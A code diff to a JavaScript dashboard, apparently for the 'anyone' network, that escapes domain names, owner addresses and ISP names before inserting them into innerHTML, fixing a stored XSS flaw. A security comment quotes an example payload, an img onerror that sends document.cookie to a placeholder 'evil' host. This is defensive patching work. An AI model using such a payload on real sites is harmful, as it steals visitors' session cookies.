@@ -8776,7 +8776,7 @@ function buildTicker(data){
     const loc = _useCity ? `${d.cityName}, ${d.countryCode||''}` :
                 d.countryName ? d.countryName :
                 `${d.geo[0].toFixed(2)}°, ${d.geo[1].toFixed(2)}°`;
-    const isp = d.topIsps && d.topIsps.length ? ` · ${d.topIsps[0].name}` : '';
+    const isp = d.topIsps && d.topIsps.length ? ` · ${_aoEscHtml(d.topIsps[0].name)}` : '';
     return `<span style="color:${s.col}">${d.relayCount.toLocaleString()} ${(typeof _i18t==='function')?_i18t('tickerRelays','RELAYS'):'RELAYS'}</span>`+
            `<span style="color:#1b404e;margin:0 7px">@</span>`+
            `<span style="color:#ffffff;font-weight:600">${loc}</span>`+
@@ -13228,11 +13228,18 @@ function renderDomains(newTokenIds = []){
 
   feed.innerHTML = list.slice(0, 120).map(d => {
     const isNew    = newTokenIds.includes(d.tokenId);
-    const namePart = d.name.replace('.anyone', '');
-    const initial  = namePart[0]?.toUpperCase() || '?';
-    const shortOwner = d.owner.slice(0, 6) + '…' + d.owner.slice(-4);
+    /* v199 SECURITY (stored XSS): .anyone domain names + owner are attacker-
+     * controlled — anyone can mint a name containing arbitrary characters, and
+     * these flow into feed.innerHTML below. Every interpolation MUST be HTML-
+     * escaped, or a crafted name like `<img src=x onerror=fetch('//evil/'+
+     * document.cookie)>` executes in the browser of every visitor who opens the
+     * Domains panel (persistent / stored XSS). */
+    const rawName  = d.name.replace('.anyone', '');
+    const namePart = _aoEscHtml(rawName);
+    const initial  = _aoEscHtml((rawName[0] || '?').toUpperCase());
+    const shortOwner = _aoEscHtml(d.owner.slice(0, 6) + '…' + d.owner.slice(-4));
     const marketUrl = `${DOMAIN_MARKET}`;
-    return `<a class="dp-item${isNew ? ' dp-new' : ''}" href="${marketUrl}" target="_blank" rel="noopener" title="${d.owner}">
+    return `<a class="dp-item${isNew ? ' dp-new' : ''}" href="${marketUrl}" target="_blank" rel="noopener" title="${_aoEscHtml(d.owner)}">
       <div class="dp-icon">${initial}</div>
       <div class="dp-info">
         <div class="dp-name"><em>${namePart}</em>.anyone</div>
